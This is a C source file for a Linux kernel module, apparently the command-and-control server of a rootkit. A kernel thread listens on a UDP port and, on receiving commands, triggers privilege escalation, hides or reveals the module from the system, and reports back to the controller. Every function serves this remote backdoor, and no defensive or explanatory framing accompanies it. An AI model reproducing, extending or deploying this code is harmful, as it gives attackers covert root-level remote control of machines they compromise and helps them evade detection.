#include "server.h"
#include "utils.h"
#include "sys_escalation.h"
#include "module_hiding.h"

struct kthread_t *kthread = NULL;

void server_do(const char *command, struct sockaddr_in *addr)
{
  int size;
  
  if (!strncmp(command, DO_PRIV_ESC, strlen(DO_PRIV_ESC))) {
    debug_print("Executing command \"%s\"", DO_PRIV_ESC);

    do_priv_esc();

    /* notify command and control */
    size = server_snd(kthread->sock, &kthread->addr, RESP_PRIV_DO, strlen(RESP_PRIV_DO));

    if (size < 0)
      debug_print("Unable to send response to command and control");
  }
  
  if (!strncmp(command, UNDO_PRIV_ESC, strlen(UNDO_PRIV_ESC))) {
    debug_print("Executing command \"%s\"", UNDO_PRIV_ESC);

    undo_priv_esc();

    /* notify command and control */
    size = server_snd(kthread->sock, &kthread->addr, RESP_PRIV_UNDO, strlen(RESP_PRIV_UNDO));

    if (size < 0)
      debug_print("Unable to send response to command and control");
  }

  if (!strncmp(command, DO_HIDE_MODULE, strlen(DO_HIDE_MODULE))) {
    debug_print("Executing command \"%s\"", DO_HIDE_MODULE);

    do_hide_module();

    /* notify command and control */
    size = server_snd(kthread->sock, &kthread->addr, RESP_HIDE_MODULE_DO, strlen(RESP_HIDE_MODULE_DO));

    if (size < 0)
      debug_print("Unable to send response to command and control");
  }

  if (!strncmp(command, DO_SHOW_MODULE, strlen(DO_SHOW_MODULE))) {
    debug_print("Executing command \"%s\"", DO_SHOW_MODULE);

    do_show_module();

    /* notify command and control */
    size = server_snd(kthread->sock, &kthread->addr, RESP_SHOW_MODULE_DO, strlen(RESP_SHOW_MODULE_DO));

    if (size < 0)
      debug_print("Unable to send response to command and control");
  }
}

int server_rcv(struct socket *sock, struct sockaddr_in *addr, unsigned char *buf, int len)
{
  struct msghdr msghdr;
  struct iovec iov;
  int size = 0;

  /* internal networking protocol agnostic socket representation */
  if (sock->sk == NULL)
    return 0;

  iov.iov_base = buf;
  iov.iov_len = len;

  msghdr.msg_name = addr;                           /* ptr to socket address structure */
  msghdr.msg_namelen = sizeof(struct sockaddr_in);  /* size of socket address structure */
  msghdr.msg_iter.iov = &iov;                       /* data */
  msghdr.msg_control = NULL;
  msghdr.msg_controllen = 0;
  msghdr.msg_flags = 0;

  iov_iter_init(&msghdr.msg_iter, READ, &iov, 1, len);

  size = sock_recvmsg(sock, &msghdr, msghdr.msg_flags);

  return size;
}

int server_snd(struct socket *sock, struct sockaddr_in *addr, unsigned char *buf, int len)
{
  struct msghdr msghdr;
  struct iovec iov;
  int size = 0;

  /* internal networking protocol agnostic socket representation */
  if (sock->sk == NULL)
    return 0;

  iov.iov_base = buf;
  iov.iov_len = len;

  msghdr.msg_name = addr;                           /* ptr to socket address structure */
  msghdr.msg_namelen = sizeof(struct sockaddr_in);  /* size of socket address structure */
  msghdr.msg_iter.iov = &iov;                       /* data */
  msghdr.msg_control = NULL;
  msghdr.msg_controllen = 0;
  msghdr.msg_flags = 0;

  iov_iter_init(&msghdr.msg_iter, WRITE, &iov, 1, len);

  size = sock_sendmsg(sock, &msghdr);

  return size;
}

int server_run(void *data)
{
  int size, res;
  unsigned char buff[MAX_UDP_BUFF];

  kthread->running = 1;

  res = sock_create(AF_INET, SOCK_DGRAM, IPPROTO_UDP, &kthread->sock);

  if (res < 0) {
    debug_print("Error in sock_create()");
    kthread->curr = NULL;
    kthread->running = 0;
    return 1;
  }

  /* initializing sockaddr structure */
  memset(&kthread->addr, 0, sizeof(struct sockaddr));
  kthread->addr.sin_family = AF_INET;
  kthread->addr.sin_addr.s_addr = htonl(INADDR_ANY);
  kthread->addr.sin_port = htons(UDP_PORT);

  /* bind socket and address */
  res = kthread->sock->ops->bind(kthread->sock, (struct sockaddr *)&kthread->addr,
				 sizeof(struct sockaddr));
  
  if (res < 0) {
    debug_print("Error in bind()");
    sock_release(kthread->sock);
    kthread->sock = NULL;
    kthread->curr = NULL;
    kthread->running = 0;
    return 1;
  }

  while(1) {
    if (kthread_should_stop())
      do_exit(0);

    memset(&buff, 0, MAX_UDP_BUFF);
    size = server_rcv(kthread->sock, &kthread->addr, buff, MAX_UDP_BUFF);

    if (signal_pending(current))
      break;

    if (size > 0)
      server_do((const char *)buff, &kthread->addr);

    schedule();
  }
  return 0;
}

int server_start(void)
{
  /* start the kernel thread for handling UDP requests */
  kthread = kmalloc(sizeof(struct kthread_t), GFP_KERNEL);
  kthread->curr = kthread_run(&server_run, NULL, "handle_udp");

  if (kthread->curr == NULL) {
    kfree(kthread);
    kthread = NULL;
    return -1;
  }

  return 0;
}

void server_stop(void)
{
  int res;
  struct pid *pid = find_get_pid(kthread->curr->pid);
  struct task_struct *task = pid_task(pid, PIDTYPE_PID);

  /* kill the kernel thread */
  if (kthread->curr != NULL) {
    res = send_sig(SIGKILL, task, 1);
    if (res > 0) {
      while(kthread->running == 1)
	msleep(50);
    }
  }

  /* destroy the socket */
  if (kthread->sock != NULL) {
    sock_release(kthread->sock);
    kthread->sock = NULL;
  }

  kfree(kthread);
  kthread = NULL;
}
